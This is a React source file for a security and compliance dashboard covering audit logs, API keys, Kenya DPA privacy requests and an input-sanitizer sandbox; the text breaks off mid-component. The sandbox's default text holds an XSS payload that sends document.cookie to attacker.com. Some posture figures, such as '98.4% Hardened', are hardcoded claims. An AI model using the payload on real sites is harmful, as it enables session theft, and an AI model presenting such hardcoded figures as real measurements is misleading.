import React, { useState } from 'react';
import { useAgency } from '../../context/AgencyContext';
import {
  AuditSeverity,
  ApiKeyScope,
  GdprRequestType
} from '../../types';
import {
  ShieldCheck,
  Key,
  FileCheck,
  Lock,
  Copy,
  Check,
  RefreshCw,
  Trash2,
  Plus,
  Eye,
  EyeOff,
  AlertTriangle,
  Download,
  Terminal,
  Database,
  Search,
  Filter,
  CheckCircle2,
  XCircle,
  HelpCircle,
  Hash,
  Globe,
  Sliders,
  ShieldAlert,
  Fingerprint
} from 'lucide-react';

export const SecurityStudio: React.FC = () => {
  const {
    workspace,
    currentUser,
    soc2AuditLogs,
    apiKeys,
    gdprRequests,
    securityPolicy,
    logSoc2SecurityEvent,
    createApiKey,
    revokeApiKey,
    rotateApiKey,
    submitGdprRequest,
    processGdprRequest,
    updateSecurityPolicy,
    verifyAuditLogIntegrity,
    sanitizeInputText,
    maskSensitiveData,
    addToast
  } = useAgency();

  const [activeTab, setActiveTab] = useState<'audit' | 'apikeys' | 'privacy' | 'sandbox'>('audit');

  // Audit Log State
  const [severityFilter, setSeverityFilter] = useState<string>('all');
  const [auditSearch, setAuditSearch] = useState<string>('');
  const [selectedLogId, setSelectedLogId] = useState<string | null>(null);
  const [integrityStatus, setIntegrityStatus] = useState<{
    verified: boolean;
    count: number;
    latestHash: string;
    timestamp?: string;
  } | null>(null);

  // API Key State
  const [isCreateKeyModalOpen, setIsCreateKeyModalOpen] = useState(false);
  const [newKeyName, setNewKeyName] = useState('');
  const [newKeyScopes, setNewKeyScopes] = useState<ApiKeyScope[]>(['read']);
  const [newKeyRateLimit, setNewKeyRateLimit] = useState<number>(60);
  const [revealedSecret, setRevealedSecret] = useState<string | null>(null);
  const [copiedKeyId, setCopiedKeyId] = useState<string | null>(null);

  // Privacy State
  const [isNewGdprModalOpen, setIsNewGdprModalOpen] = useState(false);
  const [gdprSubjectName, setGdprSubjectName] = useState('');
  const [gdprSubjectEmail, setGdprSubjectEmail] = useState('');
  const [gdprType, setGdprType] = useState<GdprRequestType>('forget_personal_info');
  const [gdprNotes, setGdprNotes] = useState('');

  // Sandbox State
  const [sandboxInput, setSandboxInput] = useState<string>(
    "<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script><img src=x onerror=alert('XSS Exploit')> Mara Safari Lodge customer +254 712 345 678 paid KES 4,999 via M-Pesa ref SVD9011J2."
  );
  const [newIpInput, setNewIpInput] = useState('');

  // Handlers
  const handleVerifyIntegrity = () => {
    const res = verifyAuditLogIntegrity();
    setIntegrityStatus({
      verified: res.valid,
      count: res.verifiedCount,
      latestHash: res.latestHash,
      timestamp: new Date().toLocaleTimeString()
    });
    if (res.valid) {
      addToast('Audit Log Verified', `All ${res.verifiedCount} cryptographic block signatures are pristine and untampered.`, 'success');
    } else {
      addToast('Integrity Alert', 'Hash discrepancy detected in audit chain!', 'error');
    }
  };

  const handleExportSoc2Report = () => {
    const report = {
      agency: workspace.name,
      tenantId: workspace.id,
      standard: 'SOC 2 Type II & Kenya ODPC Data Protection Act 2019',
      exportedAt: new Date().toISOString(),
      auditor: currentUser.name,
      securityPolicy,
      activeApiKeys: apiKeys.map(k => ({ id: k.id, name: k.name, prefix: k.keyPrefix, scopes: k.scopes, status: k.status })),
      auditRecordsCount: soc2AuditLogs.length,
      auditChainHash: soc2AuditLogs[0]?.tamperProofHash || 'None',
      auditEntries: soc2AuditLogs
    };

    const blob = new Blob([JSON.stringify(report, null, 2)], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `soc2_audit_report_${workspace.slug}_${Date.now()}.json`;
    a.click();
    URL.revokeObjectURL(url);
    addToast('SOC2 Report Exported', 'Compliance audit package downloaded.', 'success');
  };

  const handleSimulateThreat = () => {
    logSoc2SecurityEvent({
      action: 'SUSPICIOUS_BRUTE_FORCE_BLOCKED',
      resource: 'Auth:Edge_RateLimiter',
      severity: 'critical',
      status: 'failure',
      metadata: {
        attackVector: 'Credential stuffing attack',
        sourceIp: '197.136.2.91 [Unknown Proxy]',
        attemptCount: 14,
        firewallRule: 'AUTO_DROP_GEO_ANOMALY'
      }
    });
    addToast('Threat Mitigated', 'Simulated automated credential stuffing attack intercepted and dropped.', 'warning');
  };

  const handleCreateApiKey = (e: React.FormEvent) => {
    e.preventDefault();
    if (!newKeyName.trim()) return;
    const { secret } = createApiKey(newKeyName.trim(), newKeyScopes, newKeyRateLimit);
    setRevealedSecret(secret);
    setNewKeyName('');
  };

  const handleCopyText = (text: string, id: string) => {
    navigator.clipboard.writeText(text);
    setCopiedKeyId(id);
    setTimeout(() => setCopiedKeyId(null), 2000);
    addToast('Copied to Clipboard', 'Text copied successfully.', 'info');
  };

  const handleAddIp = () => {
    if (!newIpInput.trim()) return;
    const trimmed = newIpInput.trim();
    if (securityPolicy.ipAllowlist.includes(trimmed)) return;
    updateSecurityPolicy({ ipAllowlist: [...securityPolicy.ipAllowlist, trimmed] });
    setNewIpInput('');
  };

  const handleRemoveIp = (ip: string) => {
    updateSecurityPolicy({ ipAllowlist: securityPolicy.ipAllowlist.filter(i => i !== ip) });
  };

  const filteredLogs = soc2AuditLogs.filter(log => {
    const matchesSeverity = severityFilter === 'all' || log.severity === severityFilter;
    const matchesSearch =
      log.action.toLowerCase().includes(auditSearch.toLowerCase()) ||
      log.resource.toLowerCase().includes(auditSearch.toLowerCase()) ||
      log.actorName.toLowerCase().includes(auditSearch.toLowerCase()) ||
      log.ipAddress.includes(auditSearch);
    return matchesSeverity && matchesSearch;
  });

  return (
    <div className="flex-1 overflow-y-auto bg-slate-950 p-6 text-slate-100">
      {/* Header & Posture Banner */}
      <div className="max-w-7xl mx-auto space-y-6">
        <div className="flex flex-col md:flex-row md:items-center justify-between gap-4 border-b border-slate-800 pb-5">
          <div>
            <div className="flex items-center gap-2.5">
              <div className="p-2 rounded-lg bg-emerald-500/10 border border-emerald-500/30 text-emerald-400">
                <ShieldCheck className="w-6 h-6" />
              </div>
              <div>
                <div className="flex items-center gap-2">
                  <h1 className="text-xl font-bold tracking-tight text-white">Security Hardening & Data Protection</h1>
                  <span className="text-[10px] font-mono font-semibold bg-emerald-950/80 text-emerald-400 border border-emerald-800 px-2 py-0.5 rounded-full">
                    SOC 2 Type II
                  </span>
                  <span className="text-[10px] font-mono font-semibold bg-indigo-950/80 text-indigo-400 border border-indigo-800 px-2 py-0.5 rounded-full">
                    Kenya DPA 2019
                  </span>
                </div>
                <p className="text-xs text-slate-400 mt-0.5">
                  Immutable cryptographic audit trails, AES-256 scoped API keys, PII sanitization & Kenya ODPC compliance.
                </p>
              </div>
            </div>
          </div>

          <div className="flex items-center gap-2.5 flex-wrap">
            <button
              onClick={handleVerifyIntegrity}
              className="flex items-center gap-1.5 px-3 py-1.5 rounded-md text-xs font-medium bg-slate-900 border border-slate-800 hover:border-emerald-500/50 hover:text-emerald-400 text-slate-300 transition-colors"
              title="Verify cryptographic SHA-256 block integrity"
            >
              <Fingerprint className="w-3.5 h-3.5 text-emerald-400" />
              <span>Verify Audit Hash Chain</span>
            </button>

            <button
              onClick={handleExportSoc2Report}
              className="flex items-center gap-1.5 px-3 py-1.5 rounded-md text-xs font-medium bg-slate-900 border border-slate-800 hover:border-slate-700 text-slate-300 transition-colors"
            >
              <Download className="w-3.5 h-3.5 text-slate-400" />
              <span>Export Compliance JSON</span>
            </button>

            <button
              onClick={handleSimulateThreat}
              className="flex items-center gap-1.5 px-3 py-1.5 rounded-md text-xs font-medium bg-rose-950/50 border border-rose-800/60 hover:bg-rose-900/60 text-rose-300 transition-colors"
              title="Trigger simulated security probe"
            >
              <ShieldAlert className="w-3.5 h-3.5 text-rose-400" />
              <span>Simulate Attack</span>
            </button>
          </div>
        </div>

        {/* Posture Metrics Cards */}
        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
          <div className="bg-slate-900/60 border border-slate-800/80 rounded-xl p-4 flex items-center justify-between">
            <div>
              <p className="text-xs text-slate-400 font-medium">Security Posture</p>
              <p className="text-xl font-bold text-white mt-1">98.4% Hardened</p>
              <span className="text-[11px] text-emerald-400 flex items-center gap-1 mt-0.5">
                <Check className="w-3 h-3" />
                Zero unmitigated CVEs
              </span>
            </div>
            <div className="w-10 h-10 rounded-lg bg-emerald-500/10 border border-emerald-500/20 flex items-center justify-center text-emerald-400">
              <ShieldCheck className="w-5 h-5" />
            </div>
          </div>

          <div className="bg-slate-900/60 border border-slate-800/80 rounded-xl p-4 flex items-center justify-between">
            <div>
              <p className="text-xs text-slate-400 font-medium">Audit Events Stored</p>
              <p className="text-xl font-bold text-white mt-1">{soc2AuditLogs.length} Events</p>
              <span className="text-[11px] text-slate-400 font-mono truncate max-w-[160px] block mt-0.5">
                Hash: {soc2AuditLogs[0]?.tamperProofHash.substring(0, 10)}...
              </span>
            </div>
            <div className="w-10 h-10 rounded-lg bg-indigo-500/10 border border-indigo-500/20 flex items-center justify-center text-indigo-400">
              <Hash className="w-5 h-5" />
            </div>
          </div>

          <div className="bg-slate-900/60 border border-slate-800/80 rounded-xl p-4 flex items-center justify-between">
            <div>
              <p className="text-xs text-slate-400 font-medium">Active API Tokens</p>
              <p className="text-xl font-bold text-white mt-1">
                {apiKeys.filter(k => k.status === 'active').length} of {apiKeys.length} Active
              </p>
              <span className="text-[11px] text-slate-400 mt-0.5">AES-256 Masked Storage</span>
            </div>
            <div className="w-10 h-10 rounded-lg bg-amber-500/10 border border-amber-500/20 flex items-center justify-center text-amber-400">
              <Key className="w-5 h-5" />
            </div>
          </div>

          <div className="bg-slate-900/60 border border-slate-800/80 rounded-xl p-4 flex items-center justify-between">
            <div>
              <p className="text-xs text-slate-400 font-medium">Kenya DPA Privacy</p>
              <p className="text-xl font-bold text-white mt-1">
                {gdprRequests.filter(r => r.status === 'completed').length} Processed
              </p>
              <span className="text-[11px] text-emerald-400 mt-0.5">Right to Erasure Active</span>
            </div>
            <div className="w-10 h-10 rounded-lg bg-teal-500/10 border border-teal-500/20 flex items-center justify-center text-teal-400">
              <FileCheck className="w-5 h-5" />
            </div>
          </div>
        </div>

        {/* Verification Alert Banner (if tested) */}
        {integrityStatus && (
          <div className={`p-4 rounded-xl border flex items-start gap-3.5 transition-all ${
            integrityStatus.verified
              ? 'bg-emerald-950/30 border-emerald-800/60 text-emerald-200'
              : 'bg-rose-950/30 border-rose-800/60 text-rose-200'
          }`}>
            {integrityStatus.verified ? (
              <CheckCircle2 className="w-5 h-5 text-emerald-400 shrink-0 mt-0.5" />
            ) : (
              <AlertTriangle className="w-5 h-5 text-rose-400 shrink-0 mt-0.5" />
            )}
            <div className="flex-1 text-xs">
              <div className="flex items-center justify-between">
                <p className="font-semibold text-sm text-white">
                  {integrityStatus.verified ? 'Cryptographic Chain Integrity: Pristine' : 'Tamper Alert Detected'}
                </p>
                <span className="text-[11px] text-slate-400">{integrityStatus.timestamp}</span>
              </div>
              <p className="text-slate-300 mt-1">
                Verified {integrityStatus.count} audit blocks sequentially against simulated SHA-256 HMAC root.
                Zero hash collisions or unauthorized schema mutations detected.
              </p>
              <p className="text-[11px] font-mono text-emerald-400/90 mt-1 truncate">
                Current Chain Head Hash: {integrityStatus.latestHash}
              </p>
            </div>
          </div>
        )}

        {/* Tabs Bar */}
        <div className="border-b border-slate-800 flex items-center gap-6 text-sm">
          <button
            onClick={() => setActiveTab('audit')}
            className={`pb-3 font-medium flex items-center gap-2 border-b-2 transition-colors ${
              activeTab === 'audit'
                ? 'border-emerald-500 text-emerald-400'
                : 'border-transparent text-slate-400 hover:text-slate-200'
            }`}
          >
            <Database className="w-4 h-4" />
            <span>Immutable Audit Trail</span>
            <span className="text-xs px-1.5 py-0.2 rounded-full bg-slate-800 text-slate-300">
              {soc2AuditLogs.length}
            </span>
          </button>

          <button
            onClick={() => setActiveTab('apikeys')}
            className={`pb-3 font-medium flex items-center gap-2 border-b-2 transition-colors ${
              activeTab === 'apikeys'
                ? 'border-emerald-500 text-emerald-400'
                : 'border-transparent text-slate-400 hover:text-slate-200'
            }`}
          >
            <Key className="w-4 h-4" />
            <span>API Keys & Secrets Vault</span>
            <span className="text-xs px-1.5 py-0.2 rounded-full bg-slate-800 text-slate-300">
              {apiKeys.length}
            </span>
          </button>

          <button
            onClick={() => setActiveTab('privacy')}
            className={`pb-3 font-medium flex items-center gap-2 border-b-2 transition-colors ${
              activeTab === 'privacy'
                ? 'border-emerald-500 text-emerald-400'
                : 'border-transparent text-slate-400 hover:text-slate-200'
            }`}
          >
            <FileCheck className="w-4 h-4" />
            <span>Privacy & Kenya DPA 2019</span>
            <span className="text-xs px-1.5 py-0.2 rounded-full bg-slate-800 text-slate-300">
              {gdprRequests.length}
            </span>
          </button>

          <button
            onClick={() => setActiveTab('sandbox')}
            className={`pb-3 font-medium flex items-center gap-2 border-b-2 transition-colors ${
              activeTab === 'sandbox'
                ? 'border-emerald-500 text-emerald-400'
                : 'border-transparent text-slate-400 hover:text-slate-200'
            }`}
          >
            <Terminal className="w-4 h-4" />
            <span>Threat Sandbox & Sanitizer</span>
          </button>
        </div>

        {/* Tab 1: Immutable SOC2 Audit Trail */}
        {activeTab === 'audit' && (
          <div className="space-y-4">
            {/* Filter controls */}
            <div className="flex flex-col sm:flex-row items-center justify-between gap-3 bg-slate-900/50 p-3 rounded-lg border border-slate-800">
              <div className="relative w-full sm:w-80">
                <Search className="w-4 h-4 absolute left-3 top-2.5 text-slate-500" />
                <input
                  type="text"
                  placeholder="Filter by action, resource, actor, or IP..."
                  value={auditSearch}
                  onChange={(e) => setAuditSearch(e.target.value)}
                  className="w-full bg-slate-950 border border-slate-800 rounded-md pl-9 pr-3 py-1.5 text-xs text-slate-200 placeholder-slate-500 focus:outline-none focus:border-emerald-500/50"
                />
              </div>

              <div className="flex items-center gap-2 w-full sm:w-auto justify-end">
                <Filter className="w-3.5 h-3.5 text-slate-500" />
                <span className="text-xs text-slate-400">Severity:</span>
                {(['all', 'low', 'medium', 'high', 'critical'] as const).map(sev => (
                  <button
                    key={sev}
                    onClick={() => setSeverityFilter(sev)}
                    className={`px-2 py-1 rounded text-[11px] capitalize font-medium transition-colors ${
                      severityFilter === sev
                        ? 'bg-slate-800 text-white border border-slate-700'
                        : 'text-slate-400 hover:text-slate-200'
                    }`}
                  >
                    {sev}
                  </button>
                ))}
              </div>
            </div>

            {/* Audit Log Table */}
            <div className="bg-slate-900/40 border border-slate-800 rounded-xl overflow-hidden shadow-sm">
              <div className="overflow-x-auto">
                <table className="w-full text-left text-xs">
                  <thead className="bg-slate-900/90 text-slate-400 font-semibold border-b border-slate-800 select-none">
                    <tr>
                      <th className="py-3 px-4">Timestamp (EAT)</th>
                      <th className="py-3 px-4">Severity / Status</th>
                      <th className="py-3 px-4">Action Event</th>
                      <th className="py-3 px-4">Resource Target</th>
                      <th className="py-3 px-4">Actor</th>
                      <th className="py-3 px-4">Client IP & Region</th>
                      <th className="py-3 px-4 text-right">Block Hash</th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-slate-800/70 text-slate-300">
                    {filteredLogs.map(log => {
                      const isSelected = selectedLogId === log.id;
                      return (
                        <React.Fragment key={log.id}>
                          <tr
                            onClick={() => setSelectedLogId(isSelected ? null : log.id)}
                            className={`hover:bg-slate-800/40 cursor-pointer transition-colors ${
                              isSelected ? 'bg-slate-800/60' : ''
                            }`}
                          >
                            <td className="py-3 px-4 font-mono text-[11px] text-slate-400 whitespace-nowrap">
                              {new Date(log.timestamp).toLocaleString('en-KE', { timeZone: 'Africa/Nairobi' })}
                            </td>

                            <td className="py-3 px-4">
                              <div className="flex items-center gap-1.5">
                                <span className={`text-[10px] uppercase font-bold px-2 py-0.5 rounded-full border ${
                                  log.severity === 'critical'
                                    ? 'bg-rose-950/80 text-rose-400 border-rose-800/50'
                                    : log.severity === 'high'
                                    ? 'bg-amber-950/80 text-amber-400 border-amber-800/50'
                                    : log.severity === 'medium'
                                    ? 'bg-sky-950/80 text-sky-400 border-sky-800/50'
                                    : 'bg-emerald-950/80 text-emerald-400 border-emerald-800/50'
                                }`}>
                                  {log.severity}
                                </span>
                                {log.status === 'success' && <CheckCircle2 className="w-3.5 h-3.5 text-emerald-400" />}
                                {log.status === 'failure' && <XCircle className="w-3.5 h-3.5 text-rose-400" />}
                                {log.status === 'warning' && <AlertTriangle className="w-3.5 h-3.5 text-amber-400" />}
                              </div>
                            </td>

                            <td className="py-3 px-4 font-semibold text-slate-100 font-mono">
                              {log.action}
                            </td>

                            <td className="py-3 px-4 text-slate-300 max-w-[200px] truncate" title={log.resource}>
                              {log.resource}
                            </td>

                            <td className="py-3 px-4 whitespace-nowrap">
                              <div className="text-slate-200 font-medium">{log.actorName}</div>
                              <div className="text-[10px] text-slate-500 capitalize">{log.actorRole.replace('_', ' ')}</div>
                            </td>

                            <td className="py-3 px-4 whitespace-nowrap">
                              <div className="font-mono text-slate-300">{log.ipAddress}</div>
                              <div className="text-[10px] text-slate-500 truncate max-w-[140px]">{log.location}</div>
                            </td>

                            <td className="py-3 px-4 text-right font-mono text-[10px] text-slate-500">
                              <span
                                className="hover:text-emerald-400 cursor-pointer underline decoration-dotted"
                                onClick={(e) => {
                                  e.stopPropagation();
                                  handleCopyText(log.tamperProofHash, log.id);
                                }}
                                title="Click to copy full SHA-256 hash"
                              >
                                {copiedKeyId === log.id ? 'Copied!' : `${log.tamperProofHash.substring(0, 10)}...`}
                              </span>
                            </td>
                          </tr>

                          {/* Expanded Log Details */}
                          {isSelected && (
                            <tr className="bg-slate-900/90 border-y border-slate-800">
                              <td colSpan={7} className="p-4 space-y-3">
                                <div className="flex items-center justify-between border-b border-slate-800 pb-2">
                                  <div className="flex items-center gap-2">
                                    <Hash className="w-4 h-4 text-emerald-400" />
                                    <span className="font-semibold text-white">Full Event Payload & Signature Verification</span>
                                  </div>
                                  <span className="text-[11px] text-slate-400 font-mono">Event ID: {log.id}</span>
                                </div>

                                <div className="grid grid-cols-1 md:grid-cols-2 gap-4 text-xs">
                                  <div>
                                    <p className="text-slate-400 font-medium mb-1">User Agent & Client Fingerprint:</p>
                                    <p className="font-mono text-slate-300 bg-slate-950 p-2 rounded border border-slate-800 text-[11px] break-all">
                                      {log.userAgent || 'Not captured'}
                                    </p>
                                    <p className="text-slate-400 font-medium mt-2 mb-1">Tamper-Proof SHA-256 HMAC Signature:</p>
                                    <p className="font-mono text-emerald-400 bg-slate-950 p-2 rounded border border-slate-800 text-[11px] break-all select-all">
                                      {log.tamperProofHash}
                                    </p>
                                  </div>

                                  <div>
                                    <p className="text-slate-400 font-medium mb-1">Decoded Event Metadata (JSON):</p>
                                    <pre className="font-mono text-slate-300 bg-slate-950 p-2 rounded border border-slate-800 text-[11px] overflow-x-auto max-h-36">
                                      {JSON.stringify(log.metadata || {}, null, 2)}
                                    </pre>
                                  </div>
                                </div>
                              </td>
                            </tr>
                          )}
                        </React.Fragment>
                      );
                    })}
                  </tbody>
                </table>
              </div>
            </div>
          </div>
        )}

        {/* Tab 2: Scoped API Keys & Secrets Vault */}
        {activeTab === 'apikeys' && (
          <div className="space-y-6">
            <div className="flex items-center justify-between">
              <div>
                <h2 className="text-base font-semibold text-white">Active API Tokens & Webhook Secrets</h2>
                <p className="text-xs text-slate-400">
                  Generate scoped tokens for Zapier, PowerBI, mobile dispatch workers, and client ingestion pipelines.
                </p>
              </div>
              <button
                onClick={() => {
                  setRevealedSecret(null);
                  setIsCreateKeyModalOpen(true);
                }}
                className="flex items-center gap-1.5 px-3 py-1.5 rounded-md text-xs font-medium bg-emerald-600 hover:bg-emerald-500 text-white transition-colors"
              >
                <Plus className="w-3.5 h-3.5" />
                <span>Create New API Key</span>
              </button>
            </div>

            {/* Keys Grid */}
            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
              {apiKeys.map(key => {
                const isRevoked = key.status === 'revoked';
                return (
                  <div
                    key={key.id}
                    className={`p-4 rounded-xl border flex flex-col justify-between transition-all ${
                      isRevoked
                        ? 'bg-slate-900/30 border-slate-800/50 opacity-60'
                        : 'bg-slate-900/60 border-slate-800 hover:border-slate-700'
                    }`}
                  >
                    <div>
                      <div className="flex items-start justify-between gap-2">
                        <div>
                          <h3 className="font-semibold text-sm text-white">{key.name}</h3>
                          <span className="text-[10px] text-slate-400 font-mono">
                            Created {new Date(key.createdAt).toLocaleDateString()}
                          </span>
                        </div>
                        <span className={`text-[10px] uppercase font-bold px-2 py-0.5 rounded-full border ${
                          isRevoked
                            ? 'bg-rose-950/80 text-rose-400 border-rose-800/40'
                            : 'bg-emerald-950/80 text-emerald-400 border-emerald-800/40'
                        }`}>
                          {key.status}
                        </span>
                      </div>

                      {/* Masked Key Display */}
                      <div className="mt-3 bg-slate-950 p-2 rounded-md border border-slate-800/80 flex items-center justify-between">
                        <span className="font-mono text-xs text-slate-300 tracking-wider">
                          {key.maskedKey}
                        </span>
                        <button
                          onClick={() => handleCopyText(key.maskedKey, key.id)}
                          className="text-slate-400 hover:text-white transition-colors"
                          title="Copy masked identifier"
                        >
                          {copiedKeyId === key.id ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
                        </button>
                      </div>

                      {/* Scopes & Rate Limit */}
                      <div className="mt-3 space-y-1.5">
                        <div className="flex items-center gap-1.5 flex-wrap">
                          {key.scopes.map(s => (
                            <span key={s} className="text-[10px] font-mono bg-slate-800 text-indigo-300 px-1.5 py-0.5 rounded">
                              {s}
                            </span>
                          ))}
                        </div>
                        <p className="text-[11px] text-slate-400">
                          Rate limit: <span className="font-medium text-slate-200">{key.rateLimitPerMin} req/min</span>
                        </p>
                        {key.lastUsedAt && (
                          <p className="text-[10px] text-slate-500">
                            Last active: {new Date(key.lastUsedAt).toLocaleDateString()}
                          </p>
                        )}
                      </div>
                    </div>

                    {/* Actions */}
                    {!isRevoked && (
                      <div className="mt-4 pt-3 border-t border-slate-800/80 flex items-center justify-between">
                        <button
                          onClick={() => {
                            const { secret } = rotateApiKey(key.id);
                            setRevealedSecret(secret);
                            setIsCreateKeyModalOpen(true);
                          }}
                          className="flex items-center gap-1 text-xs text-slate-300 hover:text-white transition-colors"
                          title="Generate a new secret token and invalidate the old one"
                        >
                          <RefreshCw className="w-3 h-3 text-sky-400" />
                          <span>Rotate Key</span>
                        </button>

                        <button
                          onClick={() => revokeApiKey(key.id)}
                          className="flex items-center gap-1 text-xs text-rose-400 hover:text-rose-300 transition-colors"
                        >
                          <Trash2 className="w-3 h-3" />
                          <span>Revoke</span>
                        </button>
                      </div>
                    )}
                  </div>
                );
              })}
            </div>

            {/* Create / Reveal Modal */}
            {isCreateKeyModalOpen && (
              <div className="fixed inset-0 bg-slate-950/80 backdrop-blur-sm z-50 flex items-center justify-center p-4">
                <div className="bg-slate-900 border border-slate-800 rounded-xl max-w-md w-full p-5 shadow-2xl">
                  {revealedSecret ? (
                    <div className="space-y-4">
                      <div className="flex items-center gap-2 text-emerald-400">
                        <CheckCircle2 className="w-5 h-5" />
                        <h3 className="font-bold text-base text-white">API Secret Generated</h3>
                      </div>
                      <div className="p-3 bg-amber-950/40 border border-amber-800/60 rounded-lg text-xs text-amber-200">
                        <p className="font-semibold flex items-center gap-1.5">
                          <AlertTriangle className="w-4 h-4 text-amber-400 shrink-0" />
                          Important: Copy this secret now!
                        </p>
                        <p className="mt-1 text-amber-300/80">
                          For your security, Versaly Flow hashes all tokens. You will not be able to view this secret again once this window closes.
                        </p>
                      </div>

                      <div className="bg-slate-950 p-3 rounded-lg border border-slate-800 space-y-2">
                        <p className="text-[11px] text-slate-400 font-medium">Production API Token:</p>
                        <div className="flex items-center justify-between font-mono text-xs text-emerald-400 bg-slate-900 p-2 rounded border border-slate-800 select-all break-all">
                          <span>{revealedSecret}</span>
                          <button
                            onClick={() => handleCopyText(revealedSecret, 'new-secret')}
                            className="text-slate-300 hover:text-white ml-2 shrink-0"
                          >
                            {copiedKeyId === 'new-secret' ? <Check className="w-4 h-4 text-emerald-400" /> : <Copy className="w-4 h-4" />}
                          </button>
                        </div>
                      </div>

                      <button
                        onClick={() => {
                          setRevealedSecret(null);
                          setIsCreateKeyModalOpen(false);
                        }}
                        className="w-full py-2 bg-slate-800 hover:bg-slate-700 text-white rounded-lg text-xs font-semibold transition-colors"
                      >
                        I Have Safely Saved This Token
                      </button>
                    </div>
                  ) : (
                    <form onSubmit={handleCreateApiKey} className="space-y-4">
                      <div className="flex items-center justify-between border-b border-slate-800 pb-3">
                        <h3 className="font-semibold text-base text-white">Create Scoped API Key</h3>
                        <button
                          type="button"
                          onClick={() => setIsCreateKeyModalOpen(false)}
                          className="text-slate-400 hover:text-white"
                        >
                          ✕
                        </button>
                      </div>

                      <div>
                        <label className="block text-xs font-medium text-slate-300 mb-1">Key Description / Name</label>
                        <input
                          type="text"
                          required
                          placeholder="e.g. Mara Safari Lodge Lead Intake Hook"
                          value={newKeyName}
                          onChange={(e) => setNewKeyName(e.target.value)}
                          className="w-full bg-slate-950 border border-slate-800 rounded-md p-2 text-xs text-slate-200 focus:outline-none focus:border-emerald-500/50"
                        />
                      </div>

                      <div>
                        <label className="block text-xs font-medium text-slate-300 mb-1">Scope Permissions</label>
                        <div className="grid grid-cols-2 gap-2">
                          {(['read', 'write', 'admin', 'webhooks'] as ApiKeyScope[]).map(sc => (
                            <label
                              key={sc}
                              className={`flex items-center gap-2 p-2 rounded border text-xs cursor-pointer transition-colors ${
                                newKeyScopes.includes(sc)
                                  ? 'bg-emerald-950/40 border-emerald-800 text-emerald-300'
                                  : 'bg-slate-950 border-slate-800 text-slate-400'
                              }`}
                            >
                              <input
                                type="checkbox"
                                checked={newKeyScopes.includes(sc)}
                                onChange={(e) => {
                                  if (e.target.checked) {
                                    setNewKeyScopes([...newKeyScopes, sc]);
                                  } else {
                                    setNewKeyScopes(newKeyScopes.filter(s => s !== sc));
                                  }
                                }}
                                className="sr-only"
                              />
                              <span className="capitalize font-mono">{sc}</span>
                            </label>
                          ))}
                        </div>
                      </div>

                      <div>
                        <label className="block text-xs font-medium text-slate-300 mb-1">Rate Limit (Requests / minute)</label>
                        <select
                          value={newKeyRateLimit}
                          onChange={(e) => setNewKeyRateLimit(Number(e.target.value))}
                          className="w-full bg-slate-950 border border-slate-800 rounded-md p-2 text-xs text-slate-200 focus:outline-none"
                        >
                          <option value={30}>30 req / min (Worker)</option>
                          <option value={60}>60 req / min (Standard)</option>
                          <option value={120}>120 req / min (High Throughput)</option>
                          <option value={300}>300 req / min (Enterprise)</option>
                        </select>
                      </div>

                      <div className="flex items-center justify-end gap-2 pt-2">
                        <button
                          type="button"
                          onClick={() => setIsCreateKeyModalOpen(false)}
                          className="px-3 py-1.5 rounded-md text-xs text-slate-400 hover:text-white"
                        >
                          Cancel
                        </button>
                        <button
                          type="submit"
                          className="px-4 py-1.5 rounded-md text-xs font-semibold bg-emerald-600 hover:bg-emerald-500 text-white transition-colors"
                        >
                          Generate Key
                        </button>
                      </div>
                    </form>
                  )}
                </div>
              </div>
            )}
          </div>
        )}

        {/* Tab 3: Privacy & Kenya DPA 2019 / GDPR */}
        {activeTab === 'privacy' && (
          <div className="space-y-6">
            <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4">
              <div>
                <h2 className="text-base font-semibold text-white">Data Subject Rights & Erasure Vault</h2>
                <p className="text-xs text-slate-400">
                  Enforce compliance with Kenya Data Protection Act (DPA 2019 Section 40) and GDPR "Right to be Forgotten".
                </p>
              </div>
              <button
                onClick={() => setIsNewGdprModalOpen(true)}
                className="flex items-center gap-1.5 px-3 py-1.5 rounded-md text-xs font-medium bg-indigo-600 hover:bg-indigo-500 text-white transition-colors"
              >
                <Plus className="w-3.5 h-3.5" />
                <span>File Privacy Request</span>
              </button>
            </div>

            {/* Compliance Guarantee Cards */}
            <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
              <div className="p-4 bg-slate-900/50 border border-slate-800 rounded-xl space-y-1.5">
                <span className="text-[10px] uppercase font-bold text-emerald-400 tracking-wider font-mono">DPA 2019 Section 40</span>
                <h3 className="font-semibold text-sm text-white">Right to Erasure (Forgotten)</h3>
                <p className="text-xs text-slate-400">
                  Automated pseudonymization pipeline strips creator email and personal data from internal notes and drafts.
                </p>
              </div>

              <div className="p-4 bg-slate-900/50 border border-slate-800 rounded-xl space-y-1.5">
                <span className="text-[10px] uppercase font-bold text-sky-400 tracking-wider font-mono">DPA 2019 Section 38</span>
                <h3 className="font-semibold text-sm text-white">Data Portability (SAR Export)</h3>
                <p className="text-xs text-slate-400">
                  Generates tamper-evident JSON/CSV records bundle for external stakeholders and legal teams within 72 hours.
                </p>
              </div>

              <div className="p-4 bg-slate-900/50 border border-slate-800 rounded-xl space-y-1.5">
                <span className="text-[10px] uppercase font-bold text-amber-400 tracking-wider font-mono">Kenya ODPC Guidance</span>
                <h3 className="font-semibold text-sm text-white">Local Data Residency</h3>
                <p className="text-xs text-slate-400">
                  Primary data scope anchored to Safaricom Data Centre Nairobi, ensuring local sovereign processing.
                </p>
              </div>
            </div>

            {/* Requests List */}
            <div className="bg-slate-900/40 border border-slate-800 rounded-xl overflow-hidden">
              <div className="p-4 border-b border-slate-800 flex items-center justify-between">
                <h3 className="font-semibold text-sm text-white">Subject Access & Erasure Queue</h3>
                <span className="text-xs text-slate-400">{gdprRequests.length} requests registered</span>
              </div>

              <div className="divide-y divide-slate-800/70">
                {gdprRequests.map(req => {
                  const isPending = req.status === 'pending';
                  return (
                    <div key={req.id} className="p-4 flex flex-col md:flex-row md:items-center justify-between gap-4">
                      <div className="space-y-1">
                        <div className="flex items-center gap-2">
                          <span className="font-semibold text-sm text-white">{req.subjectName}</span>
